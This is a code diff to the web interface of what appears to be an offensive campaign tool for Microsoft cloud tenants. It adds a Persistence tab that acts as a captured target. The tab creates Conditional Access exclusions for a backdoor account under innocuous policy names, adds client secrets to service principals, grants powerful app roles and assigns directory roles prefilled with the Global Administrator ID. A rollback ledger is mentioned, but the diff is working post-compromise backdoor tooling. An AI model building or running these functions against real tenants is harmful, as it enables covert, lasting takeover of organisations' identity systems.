@@ -635,6 +635,7 @@
   .graph-subtab { background:none; border:none; border-bottom:2px solid transparent; color:var(--text-dim); font-family:var(--sans); font-size:13px; font-weight:500; padding:8px 14px; cursor:pointer; margin-bottom:-1px; }
   .graph-subtab:hover { color:var(--text); }
   .graph-subtab.active { color:var(--text-bright); border-bottom-color:var(--accent); }
+  .pers-out { margin-top:10px; background:var(--bg); border:1px solid var(--border); border-radius:var(--radius); padding:10px; font-family:var(--mono); font-size:11px; max-height:220px; overflow:auto; white-space:pre-wrap; word-break:break-all; }
   .graph-sub { display:none; }
   .graph-sub.active { display:block; }
 
@@ -1302,6 +1303,7 @@
           <button class="graph-subtab" onclick="switchGraphSub('teams', this)">Teams</button>
           <button class="graph-subtab" onclick="switchGraphSub('files', this)">Files</button>
           <button class="graph-subtab" onclick="switchGraphSub('users', this)">Users</button>
+          <button class="graph-subtab" onclick="switchGraphSub('persistence', this)">Persistence</button>
         </div>
 
         <div id="graph-sub-enum" class="graph-sub active">
@@ -1520,9 +1522,56 @@
           <div id="userDetailPanel" class="detail-panel" style="display:none"></div>
           <div id="groupDetailPanel" class="detail-panel" style="display:none"></div>
         </div>
+
+        <div id="graph-sub-persistence" class="graph-sub">
+          <div class="section-header">Persistence — deployed into the tenant, logged in the Deployment Ledger</div>
+          <div style="font-size:11px;color:var(--text-dim);margin-bottom:16px">
+            Acts as the target selected under <b>Enumeration</b> (<span id="persTargetHint" style="color:var(--accent3)">— none selected —</span>).
+            Every mutation is recorded in the ledger (in <code>/tools</code> → 🧹 Deployment Ledger) with its rollback descriptor. Clean up before closing the engagement.
+          </div>
+
+          <div class="config-card" style="margin-bottom:14px">
+            <div class="config-card-title" style="color:var(--warn)">CA Exclusion Policy · persistence · logged</div>
+            <div class="input-group"><label>POLICY DISPLAY NAME</label><input id="persCaName" type="text" placeholder="e.g. Legacy Auth Compatibility"></div>
+            <div class="input-group"><label>EXCLUDE USER OID</label><input id="persCaExclude" type="text" placeholder="object id of your backdoor account"></div>
+            <div class="input-group"><label>STATE</label><select id="persCaState">
+              <option value="enabledForReportingButNotEnforced">report-only (safe default)</option>
+              <option value="enabled">enabled (enforce)</option>
+              <option value="disabled">disabled</option>
+            </select></div>
+            <button class="btn btn-primary btn-sm" onclick="persCreateCAExclusion()">▶ Create CA Exclusion</button>
+            <pre id="persCaOut" class="pers-out" style="display:none"></pre>
+          </div>
+
+          <div class="config-card" style="margin-bottom:14px">
+            <div class="config-card-title" style="color:var(--warn)">SP Backdoor — Add Client Secret · persistence · logged</div>
+            <div class="input-group"><label>APP OBJECT ID</label><input id="persSecAppId" type="text" placeholder="service principal / app object id"></div>
+            <div class="input-group"><label>SECRET LABEL (optional)</label><input id="persSecLabel" type="text" placeholder="e.g. backup-key"></div>
+            <button class="btn btn-primary btn-sm" onclick="persAddAppPassword()">▶ Add Client Secret</button>
+            <pre id="persSecOut" class="pers-out" style="display:none"></pre>
+          </div>
+
+          <div class="config-card" style="margin-bottom:14px">
+            <div class="config-card-title" style="color:var(--warn)">Assign App Role (application permission) · persistence · logged</div>
+            <div class="input-group"><label>RESOURCE SP ID (e.g. Graph)</label><input id="persRoleRes" type="text" placeholder="resource service principal object id"></div>
+            <div class="input-group"><label>PRINCIPAL SP ID (backdoor)</label><input id="persRolePrin" type="text" placeholder="your SP object id"></div>
+            <div class="input-group"><label>APP ROLE ID</label><input id="persRoleId" type="text" placeholder="e.g. RoleManagement.ReadWrite.Directory id"></div>
+            <button class="btn btn-primary btn-sm" onclick="persAssignAppRole()">▶ Assign App Role</button>
+            <pre id="persRoleOut" class="pers-out" style="display:none"></pre>
+          </div>
+
+          <div class="config-card">
+            <div class="config-card-title" style="color:var(--warn)">Assign Directory Role (e.g. Global Admin) · persistence · logged</div>
+            <div class="input-group"><label>PRINCIPAL ID</label><input id="persDirPrin" type="text" placeholder="user or SP object id to elevate"></div>
+            <div class="input-group"><label>ROLE DEFINITION ID</label><input id="persDirRole" type="text" value="62e90394-69f5-4237-9190-012177145e10"></div>
+            <div class="input-group"><label>DIRECTORY SCOPE</label><input id="persDirScope" type="text" value="/"></div>
+            <button class="btn btn-primary btn-sm" onclick="persAssignDirectoryRole()">▶ Assign Directory Role</button>
+            <pre id="persDirOut" class="pers-out" style="display:none"></pre>
+          </div>
+        </div>
       </div>
 
-      
+
       <div id="tab-targets" class="tab-content">
         <div class="section-header">Loaded Targets</div>
         <div class="table-wrap">
@@ -2873,6 +2922,7 @@ function switchGraphSub(name, btn) {
   document.querySelectorAll('.graph-sub').forEach(s => s.classList.remove('active'));
   btn.classList.add('active');
   document.getElementById('graph-sub-' + name).classList.add('active');
+  if (name === 'persistence') persTargetHintUpdate();
   loadTokenLog();
 }
 
@@ -2887,6 +2937,7 @@ function graphTargetChanged() {
   graphRawMode = false;
   document.getElementById('graphRawBtn').style.display = 'none';
   document.getElementById('graphDlBtn').style.display = 'none';
+  persTargetHintUpdate();
 }
 
 function graphSetOutput(html) {
@@ -3216,6 +3267,51 @@ async function graphOp(op) {
     const r = await fetch('/api/campaigns/' + activeCampaignID + '/graph/' + encodeURIComponent(targetID) + '/' + op);
     graphFinish(op, await r.json());
   } catch(e) { graphSetOutput(`<span style="color:var(--accent2)">${escH(e.message)}</span>`); }
+}
+
+// ─── Persistence (Graph Ops subtab) ───────────────────────────────────────────
+// Reuses the selected Enumeration target + the per-campaign/target endpoints;
+// every mutation is recorded server-side in the Deployment Ledger.
+function _persIds() {
+  const tid = parseTid(document.getElementById('graphTargetSelect').value);
+  if (!tid || !activeCampaignID) { notify('Select a captured target under Enumeration first', true); return null; }
+  return { cid: activeCampaignID, tid };
+}
+function persTargetHintUpdate() {
+  const el = document.getElementById('persTargetHint');
+  if (!el) return;
+  const v = document.getElementById('graphTargetSelect');
+  el.textContent = (v && v.value) ? (v.options[v.selectedIndex]?.text || parseTid(v.value)) : '— none selected —';
+}
+async function persPost(path, body, outId) {
+  const ids = _persIds(); if (!ids) return;
+  const out = document.getElementById(outId); out.style.display = 'block'; out.textContent = 'Working...';
+  const data = await api('POST', `/campaigns/${ids.cid}/graph/${ids.tid}${path}`, body);
+  out.textContent = JSON.stringify(data, null, 2);
+}
+function persCreateCAExclusion() {
+  const name = document.getElementById('persCaName').value.trim();
+  const excl = document.getElementById('persCaExclude').value.trim();
+  if (!name || !excl) { notify('Policy name and exclude user OID required', true); return; }
+  persPost('/ca-exclusion', { display_name: name, exclude_user_id: excl, state: document.getElementById('persCaState').value }, 'persCaOut');
+}
+function persAddAppPassword() {
+  const appId = document.getElementById('persSecAppId').value.trim();
+  if (!appId) { notify('App object ID required', true); return; }
+  persPost('/add-app-password', { app_object_id: appId, display_name: document.getElementById('persSecLabel').value.trim() }, 'persSecOut');
+}
+function persAssignAppRole() {
+  const res = document.getElementById('persRoleRes').value.trim();
+  const prin = document.getElementById('persRolePrin').value.trim();
+  const role = document.getElementById('persRoleId').value.trim();
+  if (!res || !prin || !role) { notify('Resource SP, principal SP and app role ID required', true); return; }
+  persPost('/assign-app-role', { resource_sp_id: res, principal_id: prin, app_role_id: role }, 'persRoleOut');
+}
+function persAssignDirectoryRole() {
+  const prin = document.getElementById('persDirPrin').value.trim();
+  const role = document.getElementById('persDirRole').value.trim();
+  if (!prin || !role) { notify('Principal ID and role definition ID required', true); return; }
+  persPost('/assign-directory-role', { principal_id: prin, role_definition_id: role, directory_scope_id: document.getElementById('persDirScope').value.trim() || '/' }, 'persDirOut');
 }
 
 async function graphSearch(type) {
